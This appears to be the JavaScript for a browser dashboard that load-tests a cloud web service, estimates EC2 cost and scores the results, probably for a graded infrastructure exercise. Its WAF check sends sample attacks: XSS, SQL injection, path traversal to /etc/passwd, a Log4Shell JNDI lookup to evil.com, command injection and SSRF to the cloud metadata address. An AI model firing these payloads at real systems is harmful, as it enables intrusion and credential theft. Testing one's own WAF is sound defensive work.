// ===== State =====
let running = false;
let stats = { user: { total: 0, success: 0, fast: 0, times: [] }, product: { total: 0, success: 0, fast: 0, times: [] }, stress: { total: 0, success: 0, fast: 0, times: [] }, exception: { total: 0, success: 0 }, image: { total: 0, success: 0 } };
let workers = [];

function resetStats() {
  stats = { user: { total: 0, success: 0, fast: 0, times: [] }, product: { total: 0, success: 0, fast: 0, times: [] }, stress: { total: 0, success: 0, fast: 0, times: [] }, exception: { total: 0, success: 0 }, image: { total: 0, success: 0 } };
  updateUI();
}

function log(msg, isError) {
  const box = document.getElementById('logBox');
  const line = document.createElement('div');
  line.className = isError ? 'log-error' : 'log-line';
  line.textContent = '[' + new Date().toLocaleTimeString() + '] ' + msg;
  box.appendChild(line);
  box.scrollTop = box.scrollHeight;
  if (box.children.length > 200) box.removeChild(box.firstChild);
}

// ===== Load Test =====
async function sendRequest(api, url, opts) {
  const start = performance.now();
  try {
    const res = await fetch(url, opts);
    const ms = performance.now() - start;
    stats[api].total++;
    stats[api].times.push(ms);
    if (res.ok || res.status === 201) {
      stats[api].success++;
      const threshold = api === 'stress' ? 1000 : 200;
      if (ms <= threshold) stats[api].fast++;
    }
    return { ok: res.ok || res.status === 201, status: res.status, ms: ms };
  } catch (e) {
    stats[api].total++;
    stats[api].times.push(5000);
    return { ok: false, status: 0, ms: 5000 };
  }
}

async function testUser(endpoint) {
  var rnd = Math.floor(Math.random() * 500000) + 1;
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  var url = endpoint + '/v1/user?email=dbdump' + rnd + '%40example.org&requestid=' + rid + '&uuid=' + uuid;
  return sendRequest('user', url, { method: 'GET' });
}

async function testProduct(endpoint) {
  var rnd = Math.floor(Math.random() * 500000) + 1;
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  // POST로 product 생성
  var url = endpoint + '/v1/product';
  return sendRequest('product', url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestid: rid, uuid: uuid, id: 'loadtest' + rnd, name: 'test' + rnd, price: 1000 })
  });
}

async function testStress(endpoint, length) {
  var rid = Date.now().toString();
  var uuid = crypto.randomUUID();
  var url = endpoint + '/v1/stress';
  return sendRequest('stress', url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ requestid: rid, uuid: uuid, length: length })
  });
}

async function testException(endpoint) {
  var attacks = [
    { path: '/v1/user?email=' + encodeURIComponent('\x3cscript\x3ealert("xss")\x3c/script\x3e') + '&requestid=1&uuid=1', method: 'GET' },
    { path: '/v1/user?email=' + encodeURIComponent('"\x3e\x3cimg src=x onerror=alert(1)\x3e') + '&requestid=1&uuid=1', method: 'GET' },
    { path: "/v1/user?email=' OR 1=1 --&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/user?email=admin'; DROP TABLE user;--&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/product?id=1 UNION SELECT * FROM users--&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/user?email=../../etc/passwd&requestid=1&uuid=1", method: 'GET' },
    { path: '/v1/user?email=' + encodeURIComponent('${jndi:ldap://evil.com/a}') + '&requestid=1&uuid=1', method: 'GET' },
    { path: "/v1/user?email=;cat /etc/passwd&requestid=1&uuid=1", method: 'GET' },
    { path: "/v1/product?id=http://169.254.169.254/latest/meta-data&requestid=1&uuid=1", method: 'GET' },
    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "admin' OR '1'='1", email: "sqli@test.com" }) },
    { path: '/v1/user', method: 'POST', body: JSON.stringify({ requestid: "1", uuid: "1", username: "test onmouseover=alert(1)", email: "xss@evil.com" }) },
  ];

  var attack = attacks[Math.floor(Math.random() * attacks.length)];
  var url = endpoint + attack.path;
  try {
    var opts = { method: attack.method };
    if (attack.body) { opts.headers = { 'Content-Type': 'application/json' }; opts.body = attack.body; }
    var res = await fetch(url, opts);
    stats.exception.total++;
    if (res.status === 403) {
      stats.exception.success++;
      log('\u{1F6E1}\uFE0F WAF \uCC28\uB2E8 (403): ' + attack.path.substring(0, 60));
    } else {
      log('\u26A0\uFE0F WAF \uBBF8\uCC28\uB2E8 (' + res.status + '): ' + attack.path.substring(0, 60), true);
    }
    return { status: res.status };
  } catch(e) {
    stats.exception.total++;
    return { status: 0 };
  }
}

async function testImage(endpoint) {
  var rnd = Math.floor(Math.random() * 100) + 1;
  var url = endpoint + '/images/product' + rnd + '.jpg';
  var start = performance.now();
  try {
    var res = await fetch(url, { method: 'GET' });
    var ms = performance.now() - start;
    stats.image.total++;
    if (res.ok && ms <= 5000) stats.image.success++;
    return { ok: res.ok, ms: ms };
  } catch(e) {
    stats.image.total++;
    return { ok: false, ms: 5000 };
  }
}

async function test404(endpoint) {
  var paths = ['/v1/none', '/random', '/api/unknown', '/v2/user', '/admin', '/v1/delete', '/test'];
  var path = paths[Math.floor(Math.random() * paths.length)];
  var url = endpoint + path;
  try {
    var res = await fetch(url, { method: 'GET' });
    stats.notfound = stats.notfound || { total: 0, success: 0 };
    stats.notfound.total++;
    if (res.status === 404) {
      stats.notfound.success++;
    } else {
      log('\u26A0\uFE0F 404 \uBBF8\uBC18\uD658 (' + res.status + '): ' + path, true);
    }
    return { status: res.status };
  } catch(e) {
    stats.notfound = stats.notfound || { total: 0, success: 0 };
    stats.notfound.total++;
    return { status: 0 };
  }
}

async function runWorker(id) {
  var endpoint = document.getElementById('endpoint').value.replace(/\/$/, '');
  var interval = parseInt(document.getElementById('interval').value);
  var stressLen = parseInt(document.getElementById('stressLength').value);

  while (running) {
    var pick = Math.random();
    if (pick < 0.25) {
      await testUser(endpoint);
    } else if (pick < 0.45) {
      await testProduct(endpoint);
    } else if (pick < 0.60) {
      await testStress(endpoint, stressLen);
    } else if (pick < 0.75) {
      await testException(endpoint);
    } else if (pick < 0.85) {
      await test404(endpoint);
    } else {
      await testImage(endpoint);
    }
    updateUI();
    await new Promise(function(r) { setTimeout(r, interval); });
  }
}

function startTest() {
  var endpoint = document.getElementById('endpoint').value.trim();
  if (!endpoint) { alert('\uC5D4\uB4DC\uD3EC\uC778\uD2B8 URL\uC744 \uC785\uB825\uD558\uC138\uC694'); return; }
  resetStats();
  running = true;
  document.getElementById('btnStart').disabled = true;
  document.getElementById('btnStop').disabled = false;
  log('\uBD80\uD558 \uD14C\uC2A4\uD2B8 \uC2DC\uC791: ' + endpoint);

  var concurrency = parseInt(document.getElementById('concurrency').value);
  var duration = parseInt(document.getElementById('duration').value) * 1000;

  for (var i = 0; i < concurrency; i++) {
    workers.push(runWorker(i));
  }

  setTimeout(function() { if (running) stopTest(); }, duration);
}

function stopTest() {
  running = false;
  document.getElementById('btnStart').disabled = false;
  document.getElementById('btnStop').disabled = true;
  log('\uBD80\uD558 \uD14C\uC2A4\uD2B8 \uC911\uC9C0');
  workers = [];
}

// ===== UI Update =====
function updateUI() {
  var total = stats.user.total + stats.product.total + stats.stress.total + stats.exception.total + stats.image.total;
  var success = stats.user.success + stats.product.success + stats.stress.success + stats.exception.success + stats.image.success;
  var fail = total - success;
  var allTimes = stats.user.times.concat(stats.product.times, stats.stress.times);
  var avgMs = allTimes.length ? (allTimes.reduce(function(a, b) { return a + b; }, 0) / allTimes.length).toFixed(0) : 0;

  document.getElementById('statTotal').textContent = total;
  document.getElementById('statSuccess').textContent = success;
  document.getElementById('statFail').textContent = fail;
  document.getElementById('statAvgMs').textContent = avgMs + 'ms';

  var tbody = document.getElementById('apiResults');
  var apis = ['user', 'product', 'stress'];
  var html = '';
  for (var idx = 0; idx < apis.length; idx++) {
    var api = apis[idx];
    var s = stats[api];
    var avail = s.total ? ((s.success / s.total) * 100).toFixed(1) : '-';
    var perf = s.total ? ((s.fast / s.total) * 100).toFixed(1) : '-';
    var avg = s.times.length ? (s.times.reduce(function(a,b){return a+b;}, 0) / s.times.length).toFixed(0) + 'ms' : '-';
    html += '<tr><td>' + api + '</td><td>' + s.total + '</td><td>' + s.success + '</td><td>' + avail + '%</td><td>' + perf + '%</td><td>' + avg + '</td></tr>';
  }

  var wafRate = stats.exception.total ? ((stats.exception.success / stats.exception.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\u{1F6E1}\uFE0F WAF (\u21923)</td><td>' + stats.exception.total + '</td><td>' + stats.exception.success + '</td><td>' + wafRate + '%</td><td colspan="2">' + stats.exception.success + '/' + stats.exception.total + ' \uCC28\uB2E8</td></tr>';

  var nf = stats.notfound || { total: 0, success: 0 };
  var nfRate = nf.total ? ((nf.success / nf.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\uD83D\uDEAB 404</td><td>' + nf.total + '</td><td>' + nf.success + '</td><td>' + nfRate + '%</td><td colspan="2">' + nf.success + '/' + nf.total + ' \uC815\uC0C1 404</td></tr>';

  var imgRate2 = stats.image.total ? ((stats.image.success / stats.image.total) * 100).toFixed(1) : '-';
  html += '<tr><td>\uD83D\uDDBC\uFE0F \uC774\uBBF8\uC9C0</td><td>' + stats.image.total + '</td><td>' + stats.image.success + '</td><td>' + imgRate2 + '%</td><td colspan="2">' + stats.image.success + '/' + stats.image.total + ' \uC131\uACF5</td></tr>';

  tbody.innerHTML = html;
}

// ===== Cost Calculator =====
var EC2_PRICING = {
  't3.nano': 0.0068, 't3.micro': 0.0132, 't3.small': 0.0264, 't3.medium': 0.0464,
  't3.large': 0.0928, 't3.xlarge': 0.1856, 't3.2xlarge': 0.3712,
  't3a.nano': 0.0061, 't3a.micro': 0.0118, 't3a.small': 0.0236, 't3a.medium': 0.0416,
  't3a.large': 0.0832, 't3a.xlarge': 0.1664, 't3a.2xlarge': 0.3328,
  'm5.large': 0.118, 'm5.xlarge': 0.236, 'm5.2xlarge': 0.472,
  'c5.large': 0.098, 'c5.xlarge': 0.196, 'c5.2xlarge': 0.392,
  'r5.large': 0.152, 'r5.xlarge': 0.304
};

var detectedInstances = [];

// AWS Signature V4 helper
function getSignatureKey(key, dateStamp, regionName, serviceName) {
  var kDate = hmacSHA256(utf8Encode('AWS4' + key), utf8Encode(dateStamp));
  var kRegion = hmacSHA256(kDate, utf8Encode(regionName));
  var kService = hmacSHA256(kRegion, utf8Encode(serviceName));
  var kSigning = hmacSHA256(kService, utf8Encode('aws4_request'));
  return kSigning;
}

function utf8Encode(str) {
  return new TextEncoder().encode(str);
}

async function hmacSHA256(key, data) {
  var cryptoKey = await crypto.subtle.importKey('raw', key instanceof ArrayBuffer ? key : key.buffer || key, { name: 'HMAC', hash: 'SHA-256' }, false, ['sign']);
  var sig = await crypto.subtle.sign('HMAC', cryptoKey, data instanceof ArrayBuffer ? data : data.buffer || data);
  return new Uint8Array(sig);
}

async function sha256(data) {
  var encoded = typeof data === 'string' ? utf8Encode(data) : data;
  var hash = await crypto.subtle.digest('SHA-256', encoded);
  return Array.from(new Uint8Array(hash)).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
}

function toHex(arr) {
  return Array.from(arr).map(function(b) { return b.toString(16).padStart(2, '0'); }).join('');
}

async function awsRequest(accessKey, secretKey, region, service, action, params) {
  var host = service + '.' + region + '.amazonaws.com';
  var endpoint = 'https://' + host;
  var now = new Date();
  var amzDate = now.toISOString().replace(/[:-]|\.\d{3}/g, '');
  var dateStamp = amzDate.substring(0, 8);

  // Build query string
  var queryParams = Object.assign({ Action: action, Version: '2016-11-15' }, params);
  var sortedKeys = Object.keys(queryParams).sort();
  var queryString = sortedKeys.map(function(k) { return encodeURIComponent(k) + '=' + encodeURIComponent(queryParams[k]); }).join('&');

  var headers = {
    'host': host,
    'x-amz-date': amzDate
  };
  var signedHeaders = 'host;x-amz-date';
  var payloadHash = await sha256('');

  var canonicalRequest = 'GET\n/\n' + queryString + '\nhost:' + host + '\nx-amz-date:' + amzDate + '\n\n' + signedHeaders + '\n' + payloadHash;
  var credentialScope = dateStamp + '/' + region + '/' + service + '/aws4_request';
  var stringToSign = 'AWS4-HMAC-SHA256\n' + amzDate + '\n' + credentialScope + '\n' + (await sha256(canonicalRequest));

  var kDate = await hmacSHA256(utf8Encode('AWS4' + secretKey), utf8Encode(dateStamp));
  var kRegion = await hmacSHA256(kDate, utf8Encode(region));
  var kService2 = await hmacSHA256(kRegion, utf8Encode(service));
  var kSigning = await hmacSHA256(kService2, utf8Encode('aws4_request'));
  var signature = toHex(await hmacSHA256(kSigning, utf8Encode(stringToSign)));

  var authHeader = 'AWS4-HMAC-SHA256 Credential=' + accessKey + '/' + credentialScope + ', SignedHeaders=' + signedHeaders + ', Signature=' + signature;

  var resp = await fetch(endpoint + '/?' + queryString, {
    method: 'GET',
    headers: {
      'X-Amz-Date': amzDate,
      'Authorization': authHeader
    }
  });
  return await resp.text();
}

async function detectInstances() {
  var accessKey = document.getElementById('awsAccessKey').value.trim();
  var secretKey = document.getElementById('awsSecretKey').value.trim();
  var region = document.getElementById('awsRegion').value.trim();

  if (!accessKey || !secretKey) {
    log('\u26A0\uFE0F Access Key\uC640 Secret Key\uB97C \uC785\uB825\uD558\uC138\uC694', true);
    return;
  }

  log('\uD83D\uDD0D EC2 \uC778\uC2A4\uD134\uC2A4 \uC870\uD68C \uC911...');

  try {
    var params = {
      'Filter.1.Name': 'instance-state-name',
      'Filter.1.Value.1': 'running'
    };

    var xmlText = await awsRequest(accessKey, secretKey, region, 'ec2', 'DescribeInstances', params);
    var parser = new DOMParser();
    var xml = parser.parseFromString(xmlText, 'text/xml');

    // Check for errors
    var errors = xml.getElementsByTagName('Error');
    if (errors.length > 0) {
      var errMsg = errors[0].getElementsByTagName('Message')[0].textContent;
      log('\u274C AWS \uC624\uB958: ' + errMsg, true);
      return;
    }

    var items = xml.getElementsByTagName('item');
    detectedInstances = [];

    for (var i = 0; i < items.length; i++) {
      var item = items[i];
      // Only process instance items (has instanceId)
      var instanceIdEl = item.getElementsByTagName('instanceId');
      var instanceTypeEl = item.getElementsByTagName('instanceType');
      if (instanceIdEl.length === 0 || instanceTypeEl.length === 0) continue;

      var instanceId = instanceIdEl[0].textContent;
      var instanceType = instanceTypeEl[0].textContent;

      // Get Name tag
      var name = '';
      var tagSets = item.getElementsByTagName('tagSet');
      if (tagSets.length > 0) {
        var tags = tagSets[0].getElementsByTagName('item');
        for (var t = 0; t < tags.length; t++) {
          var keyEl = tags[t].getElementsByTagName('key');
          var valEl = tags[t].getElementsByTagName('value');
          if (keyEl.length > 0 && keyEl[0].textContent === 'Name' && valEl.length > 0) {
            name = valEl[0].textContent;
          }
        }
      }

      // Avoid duplicates
      var exists = false;
      for (var d = 0; d < detectedInstances.length; d++) {
        if (detectedInstances[d].id === instanceId) { exists = true; break; }
      }
      if (!exists) {
        detectedInstances.push({ id: instanceId, type: instanceType, state: 'running', name: name });
      }
    }

    renderInstances();
    calcCost();
    log('\u2705 ' + detectedInstances.length + '\uAC1C \uC2E4\uD589 \uC911 \uC778\uC2A4\uD134\uC2A4 \uAC10\uC9C0 \uC644\uB8CC');

  } catch(e) {
    log('\u274C \uC624\uB958: ' + e.message, true);
  }
}

function renderInstances() {
  document.getElementById('detectedInstances').style.display = 'block';
  var tbody = document.getElementById('instanceBody');
  var html = '';
  for (var i = 0; i < detectedInstances.length; i++) {
    var inst = detectedInstances[i];
    var price = EC2_PRICING[inst.type] || 0;
    html += '<tr><td>' + inst.id + '</td><td>' + inst.type + '</td><td style="color:#2ed573">' + inst.state + '</td><td>' + (inst.name || '-') + '</td><td>$' + price.toFixed(4) + '</td></tr>';
  }
  tbody.innerHTML = html;
}

function calcCost() {
  var hours = parseInt(document.getElementById('runHours').value);
  var rdsType = document.getElementById('rdsType').value;
  var rdsPrice = rdsType === 'multi-az' ? 0.056 : 0.028;

  var ec2CostPerHour = 0;
  if (detectedInstances.length > 0) {
    for (var i = 0; i < detectedInstances.length; i++) {
      ec2CostPerHour += (EC2_PRICING[detectedInstances[i].type] || 0);
    }
  } else {
    ec2CostPerHour = 2 * 0.0464;
  }

  var totalPerHour = ec2CostPerHour + rdsPrice;
  var baseCostPerHour = 2 * 0.0464;
  var ratio = baseCostPerHour > 0 ? ec2CostPerHour / baseCostPerHour : 0;

  document.getElementById('costResult').style.display = 'block';
  document.getElementById('costNodes').textContent = detectedInstances.length || 2;
  document.getElementById('costNodeVal').textContent = '$' + ec2CostPerHour.toFixed(4) + '/hr';
  document.getElementById('costRdsVal').textContent = '$' + rdsPrice.toFixed(4) + '/hr';
  document.getElementById('costTotal').textContent = '$' + totalPerHour.toFixed(4) + '/hr';
  document.getElementById('costBase').textContent = '$' + baseCostPerHour.toFixed(4) + '/hr';
  document.getElementById('costRatio').textContent = ratio.toFixed(2);
  document.getElementById('costTotalHours').textContent = '$' + (totalPerHour * hours).toFixed(4) + ' (' + hours + '\uC2DC\uAC04)';

  window._costRatio = ratio;
  log('\uD83D\uDCB0 \uBE44\uC6A9: EC2=$' + ec2CostPerHour.toFixed(4) + '/hr, Ratio=' + ratio.toFixed(2));
}

// ===== Scoring =====
function calculateScore() {
  var score1 = 0, score2 = 0, score3 = 0, score4 = 0;

  var imgRate = stats.image.total ? (stats.image.success / stats.image.total) * 100 : 0;
  var excRate = stats.exception.total ? (stats.exception.success / stats.exception.total) * 100 : 0;

  if (imgRate >= 90) score1 += 2.0;
  else if (imgRate >= 85) score1 += 1.5;
  else if (imgRate >= 80) score1 += 1.0;
  else if (imgRate >= 50) score1 += 0.5;

  if (excRate >= 90) score1 += 2.0;
  else if (excRate >= 85) score1 += 1.5;
  else if (excRate >= 80) score1 += 1.0;
  else if (excRate >= 50) score1 += 0.5;

  var thresholds = [90, 87.5, 85, 82.5, 80, 70, 50, 30];
  var apiList = ['user', 'product', 'stress'];
  for (var a = 0; a < apiList.length; a++) {
    var avail = stats[apiList[a]].total ? (stats[apiList[a]].success / stats[apiList[a]].total) * 100 : 0;
    for (var t = 0; t < thresholds.length; t++) { if (avail >= thresholds[t]) score2 += 0.5; }
  }

  for (var a2 = 0; a2 < apiList.length; a2++) {
    var perf = stats[apiList[a2]].total ? (stats[apiList[a2]].fast / stats[apiList[a2]].total) * 100 : 0;
    for (var t2 = 0; t2 < thresholds.length; t2++) { if (perf >= thresholds[t2]) score3 += 0.5; }
  }

  if (!window._costRatio) calcCost();
  var finalRatio = window._costRatio || 0;

  var userPerf = stats.user.total ? (stats.user.fast / stats.user.total) * 100 : 0;
  var prodPerf = stats.product.total ? (stats.product.fast / stats.product.total) * 100 : 0;
  var stressPerf = stats.stress.total ? (stats.stress.fast / stats.stress.total) * 100 : 0;
  var perfGate = userPerf >= 30 && prodPerf >= 30 && stressPerf >= 30;

  if (perfGate && finalRatio >= 0.5) {
    var costThresholds = [1.00, 1.25, 1.50, 1.75, 2.00, 2.25, 2.50, 2.75, 3.00, 3.25, 3.50, 3.75];
    for (var c = 0; c < costThresholds.length; c++) { if (finalRatio <= costThresholds[c]) score4 += 1.0; }
  }

  document.getElementById('score1').textContent = score1.toFixed(1);
  document.getElementById('score2').textContent = score2.toFixed(1);
  document.getElementById('score3').textContent = score3.toFixed(1);
  document.getElementById('score4').textContent = score4.toFixed(1);
  document.getElementById('scoreTotal').textContent = (score1 + score2 + score3 + score4).toFixed(1);

  document.getElementById('score1').style.color = score1 >= 3 ? '#2ed573' : score1 >= 2 ? '#ffa502' : '#ff4757';
  document.getElementById('score2').style.color = score2 >= 9 ? '#2ed573' : score2 >= 6 ? '#ffa502' : '#ff4757';
  document.getElementById('score3').style.color = score3 >= 9 ? '#2ed573' : score3 >= 6 ? '#ffa502' : '#ff4757';
  document.getElementById('score4').style.color = score4 >= 9 ? '#2ed573' : score4 >= 6 ? '#ffa502' : '#ff4757';

  log('\uCC44\uC810 \uC644\uB8CC: \uBE44\uC815\uC0C1=' + score1 + ', \uAC00\uC6A9\uC131=' + score2 + ', \uC131\uB2A5=' + score3 + ', \uBE44\uC6A9=' + score4 + ', \uCD1D\uC810=' + (score1+score2+score3+score4).toFixed(1) + '/40');
}
